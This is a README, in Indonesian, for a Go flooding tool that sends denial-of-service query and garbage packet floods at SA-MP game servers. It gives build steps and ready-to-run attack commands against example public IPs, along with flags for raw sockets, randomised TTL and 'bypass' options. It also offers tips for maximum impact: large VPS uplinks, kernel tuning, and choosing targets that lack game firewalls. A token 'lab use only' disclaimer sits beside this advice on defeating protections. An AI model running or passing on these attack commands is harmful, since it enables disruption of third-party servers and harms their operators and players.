# SAMP-OMEGA-REALISTIC-2026

Tool query flood & garbage flood buat SA-MP server (single machine).  
Ini versi yang lumayan berat buat server tanpa proteksi atau proteksi ringan.

**Catatan penting**  
- Cuma buat testing / lab pribadi / belajar.(admin malas tanggung jawab)
- Jangan dipake ke server orang lain tanpa izin.  
- Kalau server target pake EvoShield / Path.net / OVH Game / NFO → hampir pasti ga ngaruh setelah beberapa detik.  
- Single IP gampang kena block iptables / firewall modern.

### Fitur utama
- Pre-connect + reuse connection biar throughput tinggi
- 5000+ variasi payload (query 'c'/'d' dominan + pseudo + garbage)
- Mode: flood, burst, slow, adaptive, random, mixed
- Tuning kernel otomatis (rmem/wmem/port range/ethtool) kalau pake -raw
- Statistik realtime PPS / Mbps / peak
- Support raw socket + IPv6 + interface binding

### Requirements
- Linux (lebih bagus, tuning kernel work di Linux)
- Go 1.20 atau lebih baru
- Jalankan sebagai root kalau mau raw socket atau tuning kernel
- Koneksi uplink bagus (minimal 500 Mbps simetris biar keliatan efeknya)

### Instalasi

1. Install Go (kalau belum ada)  
   https://go.dev/doc/install  
   Atau di Ubuntu/Debian:
   ```bash
   sudo apt update
   sudo apt install golang-go
   ```

2. Clone repo ini
   ```bash
   git clone https://github.com/glarceny/samp-omega.git
   cd samp-omega
   ```

3. Build binary
   ```bash
   go mod tidy
   go build -o samp-omega
   ```

   Kalau mau binary lebih kecil & cepat:
   ```bash
   go build -ldflags "-s -w" -o samp-omega
   ```

### Cara menjalankan

**Basic (mode adaptive, auto workers)**
```bash
sudo ./samp-omega -ip 192.168.1.100 -port 7777 -time 300
```

**Mode paling agresif (cpu-burn style)**
```bash
sudo ./samp-omega -ip 1.2.3.4 -port 7777 -mode flood -workers 10000 -raw -time 600
```

**Dengan rate limit biar ga langsung kena drop**
```bash
sudo ./samp-omega -ip target.com -port 7777 -mode mixed -rate 150000 -time 400
```

**Pakai interface spesifik (misal eth1 atau ens3)**
```bash
sudo ./samp-omega -ip 1.2.3.4 -port 7777 -interface ens3 -raw
```

**Contoh full parameter yang biasa dipake**
```bash
sudo ./samp-omega \
  -ip 45.67.89.123 \
  -port 7777 \
  -mode adaptive \
  -workers 12000 \
  -time 900 \
  -raw \
  -stats 2
```

### Semua flag yang tersedia

```text
-ip string          Target IP (wajib)
-port int           Port SA-MP (default 7777)
-time int           Durasi dalam detik (default 300)
-workers int        Jumlah worker (0 = auto, default auto)
-mode string        flood / burst / slow / adaptive / random / mixed (default adaptive)
-size int           Ukuran paket target (default 512)
-raw                Pakai raw socket + TTL random (butuh root)
-6                  Pakai IPv6 (default false)
-dns string         DNS servers (belum diimplementasi full)
-proxy string       File proxy list (belum diimplementasi full)
-bypass             Enable bypass techniques (flag doang, belum full)
-rate int           Limit PPS (0 = unlimited)
-interface string   Nama interface (default eth0)
-stats int          Interval statistik detik (default 2)
```

### Tips kalau mau hasil maksimal

- Jalankan di VPS dengan uplink 1 Gbps+ (atau lebih bagus lagi 10 Gbps)
- Pakai -raw kalau Linux dan kamu root
- Kalau PPS rendah → cek ulimit -n (harus besar, minimal 100k+)
- Jangan lupa naikin /proc/sys/net/core/rmem_max & wmem_max manual kalau tuning otomatis gagal
- Server target tanpa EvoShield / game firewall → efek keliatan dalam 5–20 detik

### Legalitas

Ini cuma tool teknis.  
Tanggung jawab pengguna 100%.  
Saya tidak bertanggung jawab kalau dipakai buat hal ilegal.
